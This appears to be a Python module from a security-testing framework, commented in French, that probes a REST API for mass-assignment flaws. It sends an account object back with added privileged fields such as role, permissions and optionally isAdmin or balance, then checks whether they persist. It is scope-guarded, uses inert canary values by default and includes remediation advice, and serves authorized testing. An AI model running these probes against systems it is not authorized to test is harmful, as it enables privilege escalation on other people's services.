"""Oracle A PREUVE du MASS ASSIGNMENT — `massassign.params`.

D'OU VIENT CETTE CLASSE
------------------------
Citee par toute la litterature API 2026 comme voie DIRECTE vers la prise de compte : ajouter
un champ que le formulaire n'expose pas — `role`, `isAdmin`, `verified`, `balance` — a une
requete de mise a jour que le serveur desserialise en bloc. Audit du 2026-09-09 : AUCUN fichier
de tout l'arsenal ne la nommait, alors que c'est un trou net, universel a toute API REST, et
qu'un scanner generique ne la trouve pas — il ne sait pas quel champ DEVRAIT etre en lecture
seule.

CE QUE CET ORACLE PROUVE — TROIS POINTS
----------------------------------------
  1. REFERENCE : lire l'objet AVANT. Sans etat initial, une valeur observee ensuite ne prouve
     rien — elle pouvait deja etre la.
  2. INJECTION : renvoyer l'objet avec UN champ privilegie ajoute, portant un CANARI.
  3. PERSISTANCE : relire. Le canari est-il la ?

PREUVE = le champ absent de la reference apparait a la relecture. Le point 1 est ce qui separe
une preuve d'une coincidence.

⚠️ LA VALEUR INJECTEE EST UN CANARI, PAS UN PRIVILEGE — et c'est le coeur de la sûrete ici.
Pour prouver que `role` est assignable, on n'ecrit PAS `"admin"` : on ecrit `forgema<hex>`, une
chaine reconnaissable et sans pouvoir. Si le serveur la persiste, le champ est assignable — la
demonstration est faite, et le compte n'a jamais ete eleve. Ecrire `admin` reviendrait a
s'octroyer un privilege pour prouver qu'on aurait pu se l'octroyer : inutile, et c'est le genre
de geste qui fait fermer un programme.

Les champs BOOLEENS (`isAdmin`, `verified`) n'acceptent pas de canari textuel : ils ne sont
sondes qu'avec `destructive` accorde par le ROE, et FERMES par defaut.

⚠️ PORTEE : l'objet vise doit etre CELUI DE L'OPERATEUR. Muter l'objet d'un tiers pour
demontrer la faille serait alterer la donnee d'autrui — le differentiel deux comptes se prouve
en LISANT, pas en ecrivant chez le voisin.
"""
from __future__ import annotations

import hashlib
import json

from .oracle import ScopeGuardedOracle
from .registry import register
from .. import techniques

# Champs qu'une API ne devrait jamais accepter depuis le client sur une mise a jour de profil.
# Separes par NATURE : le canari textuel ne convient pas a un booleen ni a un montant.
CHAMPS_TEXTE = ("role", "roles", "userRole", "user_role", "type", "accountType",
                "plan", "tier", "permissions", "scope", "scopes", "group", "groups")
CHAMPS_BOOLEENS = ("isAdmin", "is_admin", "admin", "verified", "isVerified",
                   "emailVerified", "email_verified", "active", "enabled", "confirmed")
CHAMPS_NUMERIQUES = ("balance", "credit", "credits", "points", "amount", "price",
                     "quota", "limit", "discount")
# Champs de PROPRIETE : les reassigner deplace l'objet vers un autre compte. Jamais sondes en
# ecriture — la preuve ne vaut pas le risque de detacher un objet de son proprietaire legitime.
CHAMPS_PROPRIETE = ("userId", "user_id", "ownerId", "owner", "tenantId", "organizationId")

MAX_CHAMPS = 10          # borne DECLAREE du fan-out


def canari(target, champ):
    """Valeur INERTE et rejouable : `forgema` + 8 hexadecimaux. Aucun pouvoir, reconnaissable."""
    return "forgema" + hashlib.sha256(f"{target}|{champ}|forge-massassign".encode()).hexdigest()[:8]


def valeur_sonde(champ, target, destructif=False):
    """Valeur a injecter selon la NATURE du champ. None = champ non sondable en l'etat.

    Un booleen ou un montant ne peut pas porter de canari : prouver qu'ils sont assignables
    exige d'ecrire une valeur qui a un effet reel. Ces deux familles restent donc fermees tant
    que le ROE n'accorde pas `destructive`, et les champs de propriete ne sont JAMAIS ouverts.
    """
    if champ in CHAMPS_TEXTE:
        return canari(target, champ)
    if champ in CHAMPS_PROPRIETE:
        return None                       # jamais : detacherait l'objet de son proprietaire
    if not destructif:
        return None                       # booleens et montants : fermes par defaut
    if champ in CHAMPS_BOOLEENS:
        return True
    if champ in CHAMPS_NUMERIQUES:
        return 133742                     # montant reconnaissable, jamais un maximum
    return None


def champs_candidats(objet, destructif=False):
    """Champs privilegies ABSENTS de l'objet lu — ce sont eux qui trahissent une desserialisation
    en bloc. Un champ deja present et modifiable est une fonctionnalite, pas une faille."""
    presents = {k.lower() for k in (objet or {})}
    out = []
    for famille in (CHAMPS_TEXTE, CHAMPS_BOOLEENS, CHAMPS_NUMERIQUES):
        for c in famille:
            if c.lower() not in presents and valeur_sonde(c, "x", destructif) is not None:
                out.append(c)
    return out[:MAX_CHAMPS]


def extrait_json(corps):
    """Objet JSON d'une reponse, ou {} — ne leve jamais."""
    try:
        d = json.loads(corps or "")
    except Exception:            # noqa: BLE001
        return {}
    if isinstance(d, dict):
        for cle in ("data", "result", "item", "user", "profile"):
            if isinstance(d.get(cle), dict):
                return d[cle]
        return d
    return {}


# --- Enregistrement de la technique ---------------------------------------------------------------
# Classe `access_control` : s'octroyer un champ privilegie EST une elevation. Une classe neuve la
# sortirait du plancher anti-famine qui protege deja cette classe dans le planner.
techniques.register_kind(techniques._k(
    "massassign.params", "MassAssignment", True, depends_on=("recon.forms",),
    cls="access_control", cwe="CWE-915", mitre="T1078", exploit=False,
    attck_tactic="Privilege Escalation", phase="access", capability="active",
    proof_required=True))


@register("massassign.params")
class MassAssignment(ScopeGuardedOracle):
    kind = "massassign.params"
    exploit = False              # canari inerte : on prouve la recevabilite, pas le privilege
    destructive = False          # par defaut ; `destructive` ouvre booleens et montants
    web_allowed = True
    available = True
    category = "access_control"
    cwe = "CWE-915"              # Improperly Controlled Modification of Dynamically-Determined Attributes
    mitre = techniques.mitre_for("massassign.params") or "T1078"
    tool = "forge/modules/massassign.py:massassign.params"
    description = ("PROUVE qu'une API desserialise en bloc en acceptant un champ privilegie que "
                   "le formulaire n'expose pas. Trois points : etat de reference lu AVANT, "
                   "injection d'un CANARI inerte, persistance verifiee a la relecture. La valeur "
                   "injectee n'a aucun pouvoir — prouver que `role` est assignable n'exige pas "
                   "d'ecrire `admin`.")
    fix = ("Ne jamais desserialiser une entree client directement dans l'entite persistee : passer "
           "par un DTO qui ne porte QUE les champs modifiables par l'utilisateur (liste blanche), "
           "et ignorer — ou rejeter explicitement — tout champ hors de cette liste. Une liste NOIRE "
           "ne tient pas : chaque nouveau champ du modele devient assignable par oubli.")

    def _get(self, action, timeout):
        st, body, _h = self._http(str(action.target),
                                  headers=dict(action.params.get("headers", {})),
                                  timeout=timeout, method="GET")
        return st, extrait_json(body)

    def _write(self, action, objet, timeout):
        headers = {"Content-Type": "application/json"}
        headers.update(dict(action.params.get("headers", {})))
        st, body, _h = self._http(str(action.target), headers=headers, timeout=timeout,
                                  method=str(action.params.get("method", "PATCH")).upper(),
                                  data=json.dumps(objet).encode())
        return st, (body or "")

    def dry(self, action):
        return (f"# 3 etapes sur {action.target} — l'objet doit etre CELUI DE L'OPERATEUR :\n"
                f"#   1. GET   -> etat de reference (quels champs privilegies sont ABSENTS ?)\n"
                f"#   2. {str(action.params.get('method','PATCH')).upper():5s} -> le meme objet + un champ "
                f"privilegie portant un CANARI inerte (forgema…)\n"
                f"#   3. GET   -> le canari a-t-il ete PERSISTE ?\n"
                f"# Booleens et montants FERMES par defaut ; champs de propriete JAMAIS sondes.")

    def fire(self, action):
        target = str(action.target)
        if not self._in_scope(action, target):
            return [self.skip(target=target,
                              title="Mass assignment non sonde — hors perimetre (fail-closed)",
                              evidence="Aucune requete emise.", poc=self.dry(action))]
        try:
            timeout = max(1, min(int(action.params.get("timeout", 15)), 60))
        except (TypeError, ValueError):
            timeout = 15
        destructif = bool(action.params.get("destructive") or getattr(action, "destructive", False))

        # (1) REFERENCE
        st0, avant = self._get(action, timeout)
        if st0 is None:
            return [self.degraded(
                target=target, title="Mass assignment non verifie — reseau indisponible",
                evidence="Aucune reponse a la lecture de reference ; offline-safe.",
                poc=self.dry(action))]
        if not avant:
            return [self.skip(
                target=target, title="Mass assignment non sonde — l'objet n'est pas lisible en JSON",
                evidence=(f"GET {target} rend HTTP {st0} sans objet JSON exploitable. Cet oracle a "
                          f"besoin d'un etat de REFERENCE : sans lui, une valeur observee ensuite "
                          f"ne prouverait rien. Viser un point de service qui rend l'objet "
                          f"(profil, parametres, ressource) et fournir la session dans "
                          f"`params.headers`."),
                poc=self.dry(action))]

        candidats = champs_candidats(avant, destructif)
        if not candidats:
            return [self.skip(
                target=target, title="Mass assignment non sonde — aucun champ candidat",
                evidence=("Les champs privilegies connus sont soit deja presents dans l'objet "
                          "(donc ce sont des fonctionnalites, pas des failles), soit fermes par "
                          "defaut. Booleens et montants exigent `destructive` accorde par le ROE ; "
                          "les champs de propriete ne sont jamais sondes."),
                poc=self.dry(action))]

        # (2) INJECTION — un seul envoi portant tous les candidats, puis (3) RELECTURE.
        charge = dict(avant)
        attendus = {}
        for c in candidats:
            v = valeur_sonde(c, target, destructif)
            charge[c] = v
            attendus[c] = v
        st_w, _b = self._write(action, charge, timeout)
        st1, apres = self._get(action, timeout)
        if st1 is None or not apres:
            return [self.degraded(
                target=target, title="Mass assignment non verifie — relecture impossible",
                evidence=f"Ecriture HTTP {st_w}, mais la relecture n'a rien rendu ; on ne conclut pas.",
                poc=self.dry(action))]

        persistes = [c for c, v in attendus.items()
                     if c in apres and str(apres.get(c)) == str(v) and c not in avant]
        if persistes:
            return [self.proof(
                target=target, proven=True, severity="HIGH",
                title=(f"MASS ASSIGNMENT CONFIRME — {len(persistes)} champ(s) privilegie(s) "
                       f"acceptes depuis le client : {', '.join(persistes)}"),
                evidence=(f"Etat de REFERENCE (GET, HTTP {st0}) : ces champs etaient ABSENTS de "
                          f"l'objet. Ecriture (HTTP {st_w}) du meme objet augmente de ces champs. "
                          f"RELECTURE (HTTP {st1}) : ils sont PERSISTES avec la valeur envoyee. "
                          f"L'API desserialise donc l'entree client en bloc, sans liste blanche. "
                          f"⚠️ Les valeurs injectees sont des CANARIS INERTES (prefixe forgema) : "
                          f"le compte n'a ete eleve d'aucun privilege — prouver que `role` est "
                          f"assignable n'exige pas d'ecrire `admin`. IMPACT A INSTRUIRE dans le "
                          f"rapport : quel champ, ici, accorderait un privilege reel ou detournerait "
                          f"un actif. Champs de propriete (userId, ownerId, tenantId) volontairement "
                          f"NON sondes : les reassigner detacherait l'objet de son proprietaire."),
                poc=self.dry(action))]

        return [self.proof(
            target=target, proven=False, severity="INFO",
            title="Pas de mass assignment — les champs privilegies ne sont pas persistes",
            evidence=(f"Reference HTTP {st0}, ecriture HTTP {st_w}, relecture HTTP {st1}. Champs "
                      f"sondes : {candidats}. Aucun n'apparait a la relecture : l'API filtre son "
                      f"entree, ce qui est le comportement CORRECT. "
                      + ("Booleens et montants n'ont PAS ete sondes (fermes sans `destructive`) — "
                         "ce negatif ne porte que sur les champs textuels."
                         if not destructif else "")),
            poc=self.dry(action))]
